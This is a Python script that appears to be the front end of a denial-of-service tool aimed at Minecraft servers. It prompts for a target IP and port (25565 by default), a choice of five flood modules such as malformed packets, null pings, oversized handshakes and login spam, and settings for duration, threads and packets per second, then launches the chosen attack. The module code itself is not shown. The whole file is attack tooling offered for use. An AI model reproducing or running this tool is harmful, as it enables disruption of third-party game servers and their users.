from packet import malformed_packet
from packet import null_ping
from packet import big_handshake
from packet import login_spam
from packet import double_login
import os

def title(text):os.system("cls");print(((os.get_terminal_size().columns//2-len(text)//2)*" ")+text)




title("--- IP Address ---")

ip = input("IP: ")

if ip.rfind(":") == -1:
	address = ip
	port = 25565
else:
	s = ip.split(":")
	address = s[0]
	port = int(s[1])




title("--- Module ---")

modules = ["malformed_packet",
		   "null_ping",
		   "big_handshake",
		   "double_login",
		   "login_spam"]

n = 1
for i in modules:
	print(f"{n}. {i}")
	n += 1
print("Run help.py for more\n")

module = modules[int(input("Module (1-5): "))-1]



title("--- Parameters ---")

time = int(input("Time: "))
threads = int(input("Threads: "))
pps = int(input("Packets Per Seconds: "))
protocol = input("Protocol: ")




title("--- Running ---")

if module == "malformed_packet":
    malformed_packet.MalformedPacket(time,threads,address,port,pps)
elif module == "null_ping":
    null_ping.NullPing(time,threads,address,port,pps)
elif module == "big_handshake":
    big_handshake.BigHandshake(time,threads,address,port,pps)
elif module == "login_spam":
	login_spam.LoginSpam(time,threads,address,port,pps,protocol)
elif module == "double_login":
    double_login.DoubleLogin(time,threads,address,port,pps,protocol)
